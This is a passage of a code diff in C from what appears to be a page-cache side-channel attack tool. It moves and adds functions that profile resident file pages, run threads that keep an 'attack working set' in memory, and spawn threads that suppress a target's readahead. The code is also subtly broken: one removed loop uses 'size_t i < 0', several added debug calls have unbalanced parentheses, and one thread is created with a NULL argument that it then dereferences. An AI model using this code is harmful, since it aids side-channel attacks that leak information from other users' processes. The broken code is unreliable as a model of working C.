-
-    do
-    {
-        PathCombineA(full_pattern, folder, find_file_data.cFileName);
-        if(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-        {
-            if(profileAttackWorkingSetFolder(attack, full_pattern, pattern) != 0) 
-            {
-               return -1; 
-            }
-        }
-        else 
-        {
-            initialProfileResidentPagesFile(attack, full_pattern);                
-        }
-    } while(FindNextFile(handle, &find_file_data));
-    
-    FindClose(handle);
-    return 0;
-}
-
-int profileAttackWorkingSet(Attack *attack)
-{
-    int ret = 0;
-
-    for(size_t i < 0; attack->working_set_.search_paths_[i] != NULL && running; i++) 
-    {
-        if(profileAttackWorkingSetFolder(attack, attack->working_set_.search_paths_[i], inactive_list_set) != 0)
-        {
-            goto error;
-        }
-    }
-    
-    return 0;
-
-error:
-    ret = -1;
-    listDestroy(&attack->working_set_.resident_files_, closeCachedFile);
-    return ret;
-}
-#endif
-
 
 size_t activateWS(ListNode *resident_files_start, size_t resident_files_count, int use_file_api)
 {
@@ -1811,46 +2024,6 @@ size_t activateWS(ListNode *resident_files_start, size_t resident_files_count, i
     return accessed_pages * PAGE_SIZE;
 }
 
-
-void *pageAccessThreadWS(void *arg)
-{
-    PageAccessThreadWSData *page_thread_data = arg; 
-    AttackWorkingSet *ws = page_thread_data->ws_;
-    size_t current_ws_list_set = 0;
-    ListNode *resident_files_start = NULL;
-    size_t resident_files_count = 0;
-    size_t accessed_memory = 0;
-
-    while (__atomic_load_n(&page_thread_data->running_, __ATOMIC_RELAXED))
-    {
-        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) running on core %d.\n", 
-            (void *)page_thread_data->resident_files_.head_, sched_getcpu()));
-       
-        // access current working set
-        pthread_rwlock_rdlock(&ws->ws_lists_lock_);
-        if(current_ws_list_set != ws->up_to_date_list_set_)
-        {
-            current_ws_list_set = ws->up_to_date_list_set_;
-            resident_files_count = ws->resident_files_[current_ws_list_set].count_ / 
-                ws->access_thread_count_;
-            resident_files_start = listGetIndex(&ws->resident_files_[current_ws_list_set], 
-                page_thread_data->id_ * resident_files_count); 
-        }      
-        accessed_memory = activateWS(resident_files_start, resident_files_count, 
-            ws->access_use_file_api_);
-        pthread_rwlock_unlock(&ws->ws_lists_lock_);
-
-        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) accessed %zu kB memory.\n", 
-            (void *) page_thread_data->resident_files_.head_, accessed_memory / 1024));
-
-        // sleep for awhile
-        nanosleep(&page_thread_data->sleep_time_, NULL);
-    }
-
-    return NULL;
-}
-
-
 void *wsManagerThread(void *arg)
 {
     AttackWorkingSet *ws = arg;
@@ -1866,7 +2039,7 @@ void *wsManagerThread(void *arg)
     //  reserve space for access thread data structures
     if (dynArrayResize(&ws->access_threads_, ws->access_thread_count_) == NULL)
     {
-        printf(FAIL WS_MGR_TAG "Could not reserve memory...\n");
+        DEBUG_PRINT((DEBUG FAIL WS_MGR_TAG "Could not reserve memory...\n");
         goto error;
     }
     for (size_t t = 0; t < ws->access_thread_count_; t++)
@@ -1887,7 +2060,7 @@ void *wsManagerThread(void *arg)
         thread_data->sleep_time_ = ws->access_sleep_time_;
         if (pthread_create(&thread_data->tid_, NULL, pageAccessThreadWS, NULL) != 0)
         {
-            DEBUG_PRINT((FAIL WS_MGR_TAG "Error (%s) at creating WS access thread...\n", strerror(errno)));
+            DEBUG_PRINT((FAIL WS_MGR_TAG "Error " OSAL_EC_FS " at creating WS access thread...\n", OSAL_EC));
             goto error;
         }
     }
@@ -1937,6 +2110,43 @@ cleanup:
     return ret;
 }
 
+void *pageAccessThreadWS(void *arg)
+{
+    PageAccessThreadWSData *page_thread_data = arg; 
+    AttackWorkingSet *ws = page_thread_data->ws_;
+    size_t current_ws_list_set = 0;
+    ListNode *resident_files_start = NULL;
+    size_t resident_files_count = 0;
+    size_t accessed_memory = 0;
+
+    while (__atomic_load_n(&page_thread_data->running_, __ATOMIC_RELAXED))
+    {
+        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) started.\n", 
+            (void *)page_thread_data->resident_files_.head_));
+       
+        // access current working set
+        pthread_rwlock_rdlock(&ws->ws_lists_lock_);
+        if(current_ws_list_set != ws->up_to_date_list_set_)
+        {
+            current_ws_list_set = ws->up_to_date_list_set_;
+            resident_files_count = ws->resident_files_[current_ws_list_set].count_ / 
+                ws->access_thread_count_;
+            resident_files_start = listGetIndex(&ws->resident_files_[current_ws_list_set], 
+                page_thread_data->id_ * resident_files_count); 
+        }      
+        accessed_memory = activateWS(resident_files_start, resident_files_count, 
+            ws->access_use_file_api_);
+        pthread_rwlock_unlock(&ws->ws_lists_lock_);
+
+        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) accessed %zu kB memory.\n", 
+            (void *) page_thread_data->resident_files_.head_, accessed_memory / 1024));
+
+        // sleep for awhile
+        nanosleep(&page_thread_data->sleep_time_, NULL);
+    }
+
+    return NULL;
+}
 
 int reevaluateWorkingSet(AttackWorkingSet *ws)
 {
@@ -1962,7 +2172,6 @@ int reevaluateWorkingSet(AttackWorkingSet *ws)
 
     return 0;
 }
-
 
 int reevaluateWorkingSetList(List *cached_file_list, AttackWorkingSet *ws)
 {
@@ -2040,6 +2249,54 @@ error:
 /*-----------------------------------------------------------------------------
  * FUNCTIONS RELATED TO ATTACK SUPPRESS SET
  */
+
+// TODO use target files hash map to find pages and to add their readahead pages
+// watch out to not add other target pages to the suppress set
+int spawnSuppressThreads(Attack *attack, pthread_attr_t *thread_attr)
+{
+    // readahead surpressing threads for target
+    for (size_t t = 0; t < attack->ss_thread_count_; t++)
+    {
+        pthread_t tid;
+
+        // by default run on a different core if possible
+        if (pthread_create(&tid, thread_attr, suppressThread, (void *)&attack->suppress_set_) != 0)
+        {
+            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
+            return -1;
+        }
+        if (!dynArrayAppend(&attack->ss_threads_, &tid))
+        {
+            DEBUG_PRINT((DEBUG FAIL "Error at dynArrayAppend...\n");
+            return -1;
+        }
+    }
+
+    return 0;
+}
+
+void *suppressThread(void *arg)
+{
+    AttackSuppressSet *ss = arg;
+    volatile uint8_t tmp = 0;
+    uint8_t **pages = ss->target_readahead_window_.data_;
+
+    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
+    {
+        for (size_t p = 0; p < ss->target_readahead_window_.size_; p++)
+        {
+            tmp += *pages[p];
+        }
+
+#ifdef USE_NANOSLEEP
+        nanosleep(&ss->access_sleep_time_, NULL);
+#else
+        sched_yield();
+#endif
+    }
+
+    return NULL;
+}
 
 
 /*-----------------------------------------------------------------------------
